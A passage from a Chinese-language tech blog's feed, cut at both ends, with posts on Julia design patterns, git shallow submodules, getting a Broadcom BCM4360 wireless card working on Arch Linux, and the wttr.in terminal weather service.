play(::Type{Scissors}, ::Type{Papper}) = 1  
play(::Type{Rock}, ::Type{Scissors}) = 1  

play(::Type{T}, ::Type{T}) where {T &amp;lt;: Shape} = 0  

play(a:Type{&amp;lt;:Shape}, b::Type{&amp;lt;:Shape}) = - play(b, a)  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;可以把更抽象的代數運算放到 Julia 裡頭去做，但不用像以前一樣寫一大堆 if else。  &lt;/li&gt;
&lt;li&gt;Design Patterns  &lt;ul&gt;
&lt;li&gt;Composite pattern  &lt;ul&gt;
&lt;li&gt;希望結構上呈現「部份-整體」的概念  &lt;ul&gt;
&lt;li&gt;比如說你想畫一張圖  &lt;ul&gt;
&lt;li&gt;可能會包含：線、圖片、文字，而圖片裏面可能又會有不同的形狀，所以可以抽象成一個樹狀的結構。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Recursive composition  &lt;ul&gt;
&lt;li&gt;可能會有遞迴式的組合  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Composite lets clients treat individual objects and compositions of objects uniformly.  &lt;/li&gt;
&lt;li&gt;Example code  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/yuehhua/patterns.jl/blob/master/src/composite.jl"&gt;https://github.com/yuehhua/patterns.jl/blob/master/src/composite.jl&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/yuehhua/patterns.jl/blob/master/test/composite.jl"&gt;https://github.com/yuehhua/patterns.jl/blob/master/test/composite.jl&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Decorator pattern  &lt;ul&gt;
&lt;li&gt;例如：可以幫一把槍加上不同的配件，而且同樣的配件還還可以不只加一次。  &lt;/li&gt;
&lt;li&gt;Example code  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/yuehhua/patterns.jl/blob/master/src/decorator.jl"&gt;https://github.com/yuehhua/patterns.jl/blob/master/src/decorator.jl&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/yuehhua/patterns.jl/blob/master/test/decorator.jl"&gt;https://github.com/yuehhua/patterns.jl/blob/master/test/decorator.jl&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Observer pattern  &lt;ul&gt;
&lt;li&gt;Define a one-to-many dependency between objects so that when one object changes state, all its dependents are notified and updated automatically.  &lt;/li&gt;
&lt;li&gt;Example code  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/yuehhua/patterns.jl/blob/master/src/observer.jl"&gt;https://github.com/yuehhua/patterns.jl/blob/master/src/observer.jl&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/yuehhua/patterns.jl/blob/master/test/observer.jl"&gt;https://github.com/yuehhua/patterns.jl/blob/master/test/observer.jl&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Chain of responsibility pattern  &lt;ul&gt;
&lt;li&gt;Launch-and-leave requests with a single processing pipeline that contains many possible handlers.  &lt;/li&gt;
&lt;li&gt;把東西送到某個人手上，如果他能處理就處理，如果不能處理的話，就丟給下一個人處理。  &lt;/li&gt;
&lt;li&gt;如果到最後都沒有人處理的話，那就是另外一回事了。  &lt;/li&gt;
&lt;li&gt;Example code  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/yuehhua/patterns.jl/blob/master/src/chain_of_responsibility.jl"&gt;https://github.com/yuehhua/patterns.jl/blob/master/src/chain_of_responsibility.jl&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/yuehhua/patterns.jl/blob/master/test/chain_of_responsibility.jl"&gt;https://github.com/yuehhua/patterns.jl/blob/master/test/chain_of_responsibility.jl&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;補充&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/FluxML/Flux.jl"&gt;https://github.com/FluxML/Flux.jl&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Julia 的 naming convention 對於 function 的部份，如果 function name 是以 &lt;code&gt;!&lt;/code&gt; 做結尾的話，代表這個 function 有 side effect。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Algebraic_data_type"&gt;Algebraic data type&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/JuliaComputing/FemtoCleaner.jl"&gt;GitHub - JuliaComputing/FemtoCleaner.jl: The code behind femtocleaner&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/apps/femtocleaner"&gt;femtocleaner - Cleans your julia projects by upgrading deprecated syntax, removing version compatibility workarounds and anything else that has a unique upgrade path.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/JuliaStats/TimeSeries.jl"&gt;GitHub - JuliaStats/TimeSeries.jl: Time series toolkit for Julia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/JuliaCI/Nanosoldier.jl"&gt;GitHub - JuliaCI/Nanosoldier.jl: A package for running JuliaCI services on MIT's Nanosoldier cluster&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以幫你在 CI 的過程中測 Julia 程式碼的 Performance。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="julialang"></category></entry><entry><title>如何及為什麼要使用 `git clone --shallow-submodules`</title><link href="https://blog.m157q.tw/posts/2017/11/03/what-does-git-clone-shallow-submodules-do-and-how-to-use-it/" rel="alternate"></link><published>2017-11-03T16:24:16+08:00</published><updated>2017-11-03T16:24:16+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-11-03:posts/2017/11/03/what-does-git-clone-shallow-submodules-do-and-how-to-use-it/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;git clone --shallow-submodules&lt;/code&gt; must be used with &lt;code&gt;--recurse-submodules&lt;/code&gt;.&lt;br /&gt;
That is,  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;git clone --recurse-submodules --shallow-submodules &amp;lt;repository&amp;gt;&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;(git version 2.15.0)  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;How to use &lt;code&gt;--shallow-submodules&lt;/code&gt; for &lt;code&gt;git clone&lt;/code&gt;?&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;man git-clone&lt;/code&gt; 其實沒有寫得很清楚  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://git-scm.com/docs/git-clone#git-clone---no-shallow-submodules"&gt;Git - git-clone Documentation&lt;/a&gt;:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;--[no-]shallow-submodules&lt;br /&gt;
           All submodules which are cloned will be shallow with a depth of 1.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;看完以後以為只要 &lt;code&gt;git clone --shallow-submodules&lt;/code&gt;，&lt;br /&gt;
就會自動幫你 &lt;code&gt;git submodule update --init --depth 1&lt;/code&gt;，&lt;br /&gt;
但並沒有。  &lt;/p&gt;
&lt;p&gt;經過 &lt;a href="https://twitter.com/WanCW/status/924993679156056064"&gt;WanCW 的實際測試&lt;/a&gt;後才知道，&lt;br /&gt;
&lt;code&gt;--shallow-submodules&lt;/code&gt; 一定要搭配 &lt;code&gt;--recurse-submodules&lt;/code&gt; 才有作用。  &lt;/p&gt;
&lt;p&gt;如果只使用 &lt;code&gt;git clone --shallow-submodules&lt;/code&gt;，&lt;br /&gt;
會發現 submodule 的資料夾都還是空的，&lt;br /&gt;
一樣得 &lt;code&gt;git submodulte update --init --depth 1&lt;/code&gt; 才有用。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Why use &lt;code&gt;--shallow-submodules&lt;/code&gt; for &lt;code&gt;git clone&lt;/code&gt;?&lt;/h2&gt;
&lt;p&gt;減少整個 git clone 的傳輸量以及佔用硬碟的空間，&lt;br /&gt;
submodules 都只會有最新一筆的 commit 及其 data 而已。&lt;br /&gt;
（進入 submodule 後會看到 git log 只會有一筆資料）  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;When to use &lt;code&gt;--shallow-submodules&lt;/code&gt; for &lt;code&gt;git clone&lt;/code&gt;?&lt;/h2&gt;
&lt;p&gt;個人目前想到的適用情境：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;local 開發時不需要一併開發 submodule 的情況下  &lt;ul&gt;
&lt;li&gt;既然 submodule 只有需要被使用，不需要開發的話，只要抓最新的部份拿來用就好，可以減少 clone 的時間。  &lt;/li&gt;
&lt;li&gt;submodule 愈肥大的話，clone 的時間應該省愈多。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deploy 的時候  &lt;ul&gt;
&lt;li&gt;因為不需要修改 code 了，讓 CI clone source code 的時候可以減少傳輸量，加速 deploy 時的速度。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;其他有想到再補上。  &lt;/p&gt;</summary><category term="Git"></category></entry><entry><title>用 broadcom-wl-dkms 讓 BCM4360 [14e4:43a0] (rev 03) 能順利在 Arch Linux 中使用</title><link href="https://blog.m157q.tw/posts/2017/10/31/make-bcm4360-14e4-43a0-rev-03-work-on-arch-linux-with-broadcom-wl-dkms/" rel="alternate"></link><published>2017-10-31T17:10:43+08:00</published><updated>2017-10-31T17:10:43+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-10-31:posts/2017/10/31/make-bcm4360-14e4-43a0-rev-03-work-on-arch-linux-with-broadcom-wl-dkms/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;sudo pacman -S broadcom-wl-dkms&lt;/code&gt; should be good.  &lt;/p&gt;
&lt;p&gt;If you are using &lt;code&gt;wicd&lt;/code&gt; like me,&lt;br /&gt;
remember to &lt;a href="https://wiki.archlinux.org/index.php/wicd#Initial_setup"&gt;close other network management daemon&lt;/a&gt; like:  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;systemctl stop dhcpcd&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;systemctl disable dhcpcd&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;systemctl stop NetworkManager&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;systemctl disable NetworkManager&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;正文&lt;/h2&gt;
&lt;p&gt;之前好一陣子都是一直用 &lt;code&gt;broadcom-wl-dkms-248-6.30.223.248-1-x86_64&lt;/code&gt; 撐著，&lt;br /&gt;
簡單來說就是之前從 AUR 上 download 這版的 &lt;code&gt;broadcom-wl-dkms&lt;/code&gt; 下來後，&lt;br /&gt;
之後每次更新用新版的都有問題，&lt;br /&gt;
就得一直 down grade 下來&lt;br /&gt;
所以我就一直留著舊版的以備不時之需，&lt;br /&gt;
救了我好幾次。  &lt;/p&gt;
&lt;p&gt;而且因為 dkms 每次在 kernel upgrade 之後，&lt;br /&gt;
都會幫你重新 build 一次，&lt;br /&gt;
基本上不用理他，&lt;br /&gt;
所以我後來也把原本有從 AUR 上裝的 &lt;code&gt;broadcom-wl-dkms&lt;/code&gt; 刪掉了，&lt;br /&gt;
之後自動更新就不會需要一直 down grade。  &lt;/p&gt;
&lt;p&gt;直到昨天升上 &lt;code&gt;Linux 4.13.9-1-ARCH&lt;/code&gt;，&lt;br /&gt;
dkms 無法成功 build &lt;code&gt;broadcom-wl-dkms-248-6.30.223.248-1-x86_64&lt;/code&gt;，&lt;br /&gt;
我在升級 kernel 的時候又沒去注意 kernel upgrade 的訊息，&lt;br /&gt;
於是我的無線網卡在重開機之後就消失在 &lt;code&gt;ip&lt;/code&gt;, &lt;code&gt;iwconfig&lt;/code&gt; 的 output 了。  &lt;/p&gt;
&lt;p&gt;以前就遇過好幾次這狀況了，&lt;br /&gt;
所以並沒有特別的驚慌。&lt;br /&gt;
想說來試裝看看新版的 &lt;code&gt;broadcom-wl-dkms&lt;/code&gt;，&lt;br /&gt;
才發現&lt;a href="https://www.archlinux.org/packages/community/x86_64/broadcom-wl-dkms/"&gt;已經從 AUR 被移到 community repository 了&lt;/a&gt;，&lt;br /&gt;
用 &lt;code&gt;sudo pacman -S broadcom-wl-dkms&lt;/code&gt; 安裝後，&lt;br /&gt;
看了一下訊息，&lt;br /&gt;
看起來有成功 build 並安裝。  &lt;/p&gt;
&lt;p&gt;重開機之後，&lt;br /&gt;
無線網卡出現了，&lt;br /&gt;
也搜尋得到 SSID，&lt;br /&gt;
但就是連不上。&lt;br /&gt;
卡了很久，&lt;br /&gt;
想說回來看看以前自己寫的&lt;a href="/posts/2015/09/10/install-arch-linux-on-macbook-air-mid-2013/"&gt;這篇文章&lt;/a&gt;會不會有什麼端倪，&lt;br /&gt;
結果就看到了&lt;br /&gt;
「記得 disable dhcpcd，錯誤訊息也看不出啥端倪，就是在這卡了很久。」&lt;br /&gt;
頓時覺得似曾相似。  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;systemctl status dhcpcd&lt;/code&gt; 是 inactive 的，&lt;br /&gt;
又想到了 &lt;code&gt;NetworkManager&lt;/code&gt; 也會影響到，&lt;br /&gt;
&lt;code&gt;systemctl status NetworkManager&lt;/code&gt; 是 running...&lt;br /&gt;
靠，怎麼又被誰打開了，&lt;br /&gt;
&lt;code&gt;systemctl stop NetworkManager&lt;/code&gt; 之後果然就正常了。&lt;br /&gt;
因為之前沒有紀錄錯誤訊息導致我這次找超久，&lt;br /&gt;
所以這次就來紀錄一下這些在 &lt;code&gt;dmesg&lt;/code&gt; 會看到的錯誤訊息吧。&lt;br /&gt;
（同樣的錯誤訊息也有新增在之前的文章了。）  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[ 6677.574915] ERROR @wl_notify_scan_status :  
[ 6677.574919] wlp3s0 Scan_results error (-22)  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[ 6560.346608] ERROR @wl_cfg80211_scan :  
[ 6560.346611] WLC_SCAN error (-22)  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[ 6467.860408] ERROR @wl_notify_scan_status :  
[ 6467.860413] wlp3s0 Scan_results error (-22)  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;也因為這次的遭遇而誕生了這篇新文章，&lt;br /&gt;
畢竟網路上跟 Arch Linux 相關的資源實在有點少，&lt;br /&gt;
拿這些錯誤訊息去 Google 看到跟 Arch Linux 相關的，&lt;br /&gt;
大多是 DELL 筆電 (XPS 13, Vostro 3560) 的問題，&lt;br /&gt;
&lt;a href="https://bbs.archlinux.org/viewtopic.php?pid=1216302#p1216302"&gt;解法是要用 Fn+PrtScrn 把 Wireless 開啟&lt;/a&gt;。&lt;br /&gt;
第二多的就是跟 Ubuntu 相關的，&lt;br /&gt;
&lt;a href="https://askubuntu.com/a/60395"&gt;有篇超級詳細的回答已經紀錄在這了&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;小確幸&lt;/h2&gt;
&lt;p&gt;不得不說一下，&lt;br /&gt;
這種幾年前自己寫的筆記，&lt;br /&gt;
救了現在的自己的感覺，&lt;br /&gt;
真的是會讓人有  &lt;/p&gt;
&lt;p&gt;「啊，還好當初有花時間紀錄下來。」  &lt;/p&gt;
&lt;p&gt;的那種欣慰又安全的感覺啊。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;題外話: DKMS&lt;/h2&gt;
&lt;p&gt;也是這次查解法的過程看到&lt;a href="https://bbs.archlinux.org/viewtopic.php?pid=1370568#p1370568"&gt;這篇文章&lt;/a&gt;才知道，&lt;br /&gt;
其實 Arch Linux 現在每次 kernel upgrade 幫你做的事大致上就是  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;dkms remove &lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;KERNEL_MODULE_NAME&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt; -v &lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;KERNEL_MODULE_VERSION&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt; -k &lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;CURRENT_KERNEL_VERSION&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt;  
dkms install &lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;KERNEL_MODULE_NAME&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt; -v &lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;KERNEL_MODULE_VERSION&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt; -k &lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;NEW_KERNEL_VERSION&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;實際大概長的像這樣  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;dkms remove broadcom-wl -v 6.30.223.271-15 -k 4.13.8-1-ARCH  
dkms install broadcom-wl -v 6.30.223.271-15 -k 4.13.9-1-ARCH  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;至於 &lt;code&gt;dkms install&lt;/code&gt; == &lt;code&gt;dkms build&lt;/code&gt; + &lt;code&gt;dkms add&lt;/code&gt;&lt;br /&gt;
這個可以 &lt;code&gt;man dkms&lt;/code&gt; 就可以看到了  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;install [module/module-version] [-k kernel/arch] [/path/to/driver.rpm]  

    Installs  a  built module/version combo onto the kernel it was built for.  
    If the kernel option is not specified it assumes the currently running kernel.  
    If the module has not been built, dkms will try to build it.  
    If the module has  not been added, dkms will try to add it.  
    In both cases, the install command can then take the same arguments as the build or add commands.  
    If you pass a .rpm file, dkms will try to install that file with rpm -Uvh ,  
    and it will perform an autoinstall action to mesure that everything is built for your kernel if the RPM installed sucess‐  
    fully.  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;這只是個人粗淺的理解，&lt;br /&gt;
如果理解有誤的話還請不吝指教。  &lt;/p&gt;</summary><category term="Arch Linux"></category><category term="Broadcom"></category><category term="Wireless"></category><category term="MacBook Air"></category></entry><entry><title>wttr.in - 一個讓你用網頁或終端機看天氣或月亮圓缺的有趣網站</title><link href="https://blog.m157q.tw/posts/2017/10/20/wttr-in/" rel="alternate"></link><published>2017-10-20T23:35:15+08:00</published><updated>2017-10-20T23:35:15+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-10-20:posts/2017/10/20/wttr-in/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;最近不知道為啥身邊一堆人在傳 &lt;a href="http://wttr.in"&gt;wttr.in&lt;/a&gt;，&lt;br /&gt;
才發現好像有很多人不知道。&lt;br /&gt;
自己是有陣子之前就開始用了，&lt;br /&gt;
當時有花一點時間亂看過&lt;a href="https://github.com/chubin/wttr.in"&gt;這個專案的程式碼&lt;/a&gt;，&lt;br /&gt;
依稀記得 wttr.in 有一些比較少人知道的小功能，&lt;br /&gt;
回朋友的某個跟 wttr.in 相關的 Facebook 動態時又去找了一下。&lt;br /&gt;
查著查著突然心血來潮，&lt;br /&gt;
乾脆寫這篇廢文筆記一下。  &lt;/p&gt;
&lt;p&gt;反正邊緣人的週五晚上沒事做。（嗚嗚  &lt;/p&gt;
&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;curl wttr.in&lt;/code&gt; &amp;amp;&amp;amp; &lt;code&gt;curl wttr.in/:help&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://wttr.in"&gt;http://wttr.in&lt;/a&gt; &amp;amp;&amp;amp; &lt;a href="http://wttr.in/:help"&gt;http://wttr.in/:help&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;專案的原始碼在這：&lt;a href="https://github.com/chubin/wttr.in"&gt;https://github.com/chubin/wttr.in&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;介紹&lt;/h2&gt;
&lt;p&gt;最簡單的用法就是 &lt;code&gt;curl wttr.in&lt;/code&gt;&lt;br /&gt;
或用網頁瀏覽器直接連到 &lt;a href="http://wttr.in"&gt;http://wttr.in&lt;/a&gt;&lt;br /&gt;
就會得到像這樣精美的 ASCII Art 天氣預報圖。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="wttr-web" src="/files/wttr-in/wttr-web.jpg" /&gt;&lt;br /&gt;
&lt;img alt="wttr-cli" src="/files/wttr-in/wttr-cli.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;但基本上要用等寬字型才會比較正確的顯示，&lt;br /&gt;
否則排版會亂掉。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;比較少人知道的功能&lt;/h2&gt;
&lt;h3&gt;支援 UTF-8&lt;/h3&gt;
&lt;p&gt;所以其實可以直接用中文  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl wttr.in/台北&lt;/code&gt; 或 &lt;a href="http://wttr.in/台北"&gt;http://wttr.in/台北&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;可以用不同的形式指定想查的城市天氣&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Supported location types:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/paris                  # city name  
/~Eiffel+tower          # any location  
/Москва                 # Unicode name of any location in any language  
/muc                    # airport code (3 letters)  
/@stackoverflow.com     # domain name  
/94107                  # area codes  
/-78.46,106.79          # GPS coordinates
&lt;/pre&gt;&lt;/div&gt;


&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;城市名稱（含 UTF-8，不一定要用英文）  &lt;/li&gt;
&lt;li&gt;~地標  &lt;/li&gt;
&lt;li&gt;機場代號  &lt;/li&gt;
&lt;li&gt;@域名 （透過 DNS 去搜尋該域名所註冊的城市）  &lt;/li&gt;
&lt;li&gt;IP 位址  &lt;/li&gt;
&lt;li&gt;美國郵遞區號  &lt;/li&gt;
&lt;li&gt;經緯度  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;支援不同語言顯示&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Localization:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl fr.wttr.in/Paris  
$ curl wttr.in/paris?lang&lt;span class="o"&gt;=&lt;/span&gt;fr  
$ curl -H &lt;span class="s2"&gt;&amp;quot;Accept-Language: fr&amp;quot;&lt;/span&gt; wttr.in/paris
&lt;/pre&gt;&lt;/div&gt;


&lt;/blockquote&gt;
&lt;p&gt;可以用中文顯示，&lt;br /&gt;
用法是這樣  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://zh.wttr.in/taipei"&gt;http://zh.wttr.in/taipei&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://wttr.in/taipei?lang=zh"&gt;http://wttr.in/taipei?lang=zh&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;curl -H "Accept-Language: zh" wttr.in/taipei&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;不過這部份還在持續開發中，&lt;br /&gt;
目前是神奇的簡繁混雜的狀況。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="wttr-cli-zh" src="/files/wttr-in/wttr-cli-zh.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;中文翻譯的 Issue &lt;a href="https://github.com/chubin/wttr.in/issues/83"&gt;在此&lt;/a&gt;&lt;br /&gt;
追了一下，&lt;br /&gt;
應該是中間的討論產生了一些誤解，&lt;br /&gt;
原本有人給簡中翻譯，&lt;br /&gt;
結果後來有人以為是繁中，&lt;br /&gt;
所以就變這樣哩，&lt;br /&gt;
是個可以發 PR 的機會。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;可以直接產生 PNG 圖片&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;PNG options:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/paris.png              # generate a PNG file  
?p                      # add frame arond the output  
?t                      # transparency 150  
transparency=...        # transparency from 0 to 255 (255 = not transparent)
&lt;/pre&gt;&lt;/div&gt;


&lt;/blockquote&gt;
&lt;p&gt;&lt;a href="http://wttr.in/taipei.png"&gt;http://wttr.in/taipei.png&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;支援加邊框和調整透明度的參數&lt;br /&gt;
PS：圖片這邊也支援使用下面會提到的參數  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;可以接受參數&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Units:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;?m     # metric (SI) (used by default everywhere except US)  
?u     # USCS (used by default in US)  
?M     # show wind speed in m/s
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;View options:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;?0     # only current weather  
?1     # current weather + 1 day  
?2     # current weather + 2 days  
?n     # narrow version (only day and night)  
?q     # quiet version (no &amp;quot;Weather report&amp;quot; text)  
?Q     # superquiet version (no &amp;quot;Weather report&amp;quot;, no city name)  
?T     # switch terminal sequences off (no colors)
&lt;/pre&gt;&lt;/div&gt;


&lt;/blockquote&gt;
&lt;p&gt;其實&lt;a href="https://github.com/chubin/wttr.in/blob/ac939032fd593b14584ce5c38a86a68026a0190a/share/help.txt"&gt;這程式有吃不少參數&lt;/a&gt;，&lt;br /&gt;
也可以用 &lt;code&gt;curl wttr.in/:help&lt;/code&gt; 直接查看。&lt;br /&gt;
傳參數給它的方法是接在問號後面，&lt;br /&gt;
像 &lt;code&gt;curl "wttr.in/taipei?0"&lt;/code&gt;&lt;br /&gt;
大家可以自己試試看，&lt;br /&gt;
這邊就不一一介紹了。  &lt;/p&gt;
&lt;p&gt;我自己慣用的參數就以下這兩個：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0&lt;/code&gt;: 只顯示現在天氣，不顯示未來幾天的預報  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;q&lt;/code&gt;: 讓輸出不會顯示 "Weather Report" 的字串  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;加上這兩個參數以後輸出就會變得非常簡潔乾淨，&lt;br /&gt;
很適合拿來放在 motd&lt;br /&gt;
&lt;code&gt;curl "wttr.in/taipei?0q"&lt;/code&gt;&lt;br /&gt;
&lt;img alt="wttr-cli-0q" src="/files/wttr-in/wttr-cli-0q.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;可以接多個參數&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Options can be combined:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/Paris?0pq  
/Paris?0pq&amp;amp;lang=fr  
/Paris_0pq.png          # in PNG the file mode are specified after _  
/Rome_0pq_lang=it.png   # long options are separated with underscore
&lt;/pre&gt;&lt;/div&gt;


&lt;/blockquote&gt;
&lt;p&gt;多個參數就直接接上去就好了，&lt;br /&gt;
&lt;code&gt;&amp;amp;&lt;/code&gt; 可加可不加，&lt;br /&gt;
除非遇到像有等號的 &lt;code&gt;lang=zh&lt;/code&gt; 才得加 &lt;code&gt;&amp;amp;&lt;/code&gt;&lt;br /&gt;
也就是說  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/taipei?0q&lt;/code&gt; 等同於 &lt;code&gt;/taipei?0&amp;amp;q&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;taipei?0&amp;amp;q&amp;amp;lang=zh&lt;/code&gt; 等同於 &lt;code&gt;/taipei?0q&amp;amp;lang=zh&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果是要 png 圖片的話要變這樣  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/taipei_0g.png&lt;/code&gt; 等同於 &lt;code&gt;/taipei_0&amp;amp;q.png&lt;/code&gt;  &lt;/li&gt;
